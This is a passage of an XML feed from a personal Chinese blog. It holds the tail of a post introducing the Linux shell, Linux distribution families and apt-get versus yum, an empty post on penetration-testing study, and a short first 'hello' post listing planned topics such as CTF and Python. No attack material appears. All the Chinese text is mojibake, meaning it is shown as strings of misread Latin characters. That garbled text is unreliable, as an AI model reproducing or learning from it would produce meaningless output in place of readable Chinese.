¸ä»¥å¯åŠ¨å®ƒã€‚</p><p>â€‹        ä¹Ÿå¯ä»¥å°†<strong>å¤šä¸ªshellå‘½ä»¤æ”¾å…¥æ–‡ä»¶ä¸­</strong>ä½œä¸ºç¨‹åºæ‰§è¡Œï¼Œè¿™äº›æ–‡ä»¶è¢«ç§°ä½œ<strong>shellè„šæœ¬</strong>ã€‚ä½ åœ¨å‘½ä»¤è¡Œä¸Šæ‰§è¡Œçš„ä»»ä½•å‘½ä»¤éƒ½å¯æ”¾è¿›ä¸€ä¸ªshellè„šæœ¬ä¸­ä½œä¸ºä¸€ç»„å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ºåˆ›å»ºé‚£ç§éœ€è¦æŠŠå‡ ä¸ªå‘½ä»¤æ”¾åœ¨ä¸€èµ·æ¥å·¥ä½œçš„å·¥å…·æä¾›äº†ä¾¿åˆ©ã€‚</p><p>â€‹        linuxæœ‰å¥½å‡ ç§ç‰ˆæœ¬çš„shellï¼Œé»˜è®¤çš„æ˜¯bash shellã€‚</p><h3 id="1-2-Linuxç³»ç»Ÿåˆ†ç±»"><a href="#1-2-Linuxç³»ç»Ÿåˆ†ç±»" class="headerlink" title="1.2 Linuxç³»ç»Ÿåˆ†ç±»"></a>1.2 Linuxç³»ç»Ÿåˆ†ç±»</h3><p>â€‹        Linuxä¸»è¦çš„ç³»ç»Ÿå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š<strong>Debian</strong>å’Œ<strong>Redhat</strong>ï¼Œè¯æœ‰ä¸€äº›å…¶ä»–çš„è‡ªç”±å‘å¸ƒçš„ç‰ˆæœ¬ã€‚</p><p>â€‹        Debianç³»åˆ—ä¸»è¦æœ‰Debianã€Ubuntuç­‰ã€‚</p><p>â€‹        Redhatç³»åˆ—ä¸»è¦æœ‰Redhatã€CentOsç­‰ã€‚</p><p>â€‹        <strong>ä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬æŸäº›å‘½ä»¤å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„</strong>ï¼Œæ¯”å¦‚ Debian ä½¿ç”¨ <font color="#FF5E3A" size="4">apt-get</font>æ¥å®‰è£…åŒ…ï¼Œä½†CentOsä½¿ç”¨ <font color="#FF5E3A" size="4">yum</font>ã€‚</p><hr><p>ç¬¬ä¸€å¼ å°±æ˜¯ç®€è¦ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯linux shellä»¥åŠå¸¸è§çš„å‘è¡Œç‰ˆæœ¬ã€‚ä¸‹ä¸€ç« ï¼Œå°†è¯¦ç»†è®²è§£shellçš„ä½¿ç”¨ã€‚</p><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux1/202201150952192.jpg" alt="hello">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€å­¦ä¹ </title>
    <link href="https://huhu-myh.github.io/posts/myh10001.html"/>
    <id>https://huhu-myh.github.io/posts/myh10001.html</id>
    <published>2022-01-14T05:30:01.000Z</published>
    <updated>2022-01-16T08:41:44.414Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ç½‘å®‰" scheme="https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="æ¸—é€" scheme="https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hello</title>
    <link href="https://huhu-myh.github.io/posts/myh10000.html"/>
    <id>https://huhu-myh.github.io/posts/myh10000.html</id>
    <published>2022-01-14T02:21:39.000Z</published>
    <updated>2022-01-20T08:58:56.851Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>helloï¼Œè¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢,ä»¥åè¿™é‡Œä¼šè®°å½•æˆ‘çš„æ—¥å¸¸ç”Ÿæ´»å’Œå­¦ä¹ !</p><p>å¤§æ¦‚æ›´æ–°çš„å­¦ä¹ å†…å®¹ä¼šæœ‰CTFï¼Œæ¸—é€ï¼Œæœºå™¨å­¦ä¹ ï¼Œpythonï¼ŒJavaçš„ç›¸å…³çŸ¥è¯†ï¼ŒæœŸå¾…æ‚¨çš„æ¥è®¿~</p><hr><img src="/images/1.png" alt="hello" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æ—¥å¸¸" scheme="https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="diary" scheme="https://huhu-myh.github.io/tags/diary/"/>
    
  </entry>
  
</feed>
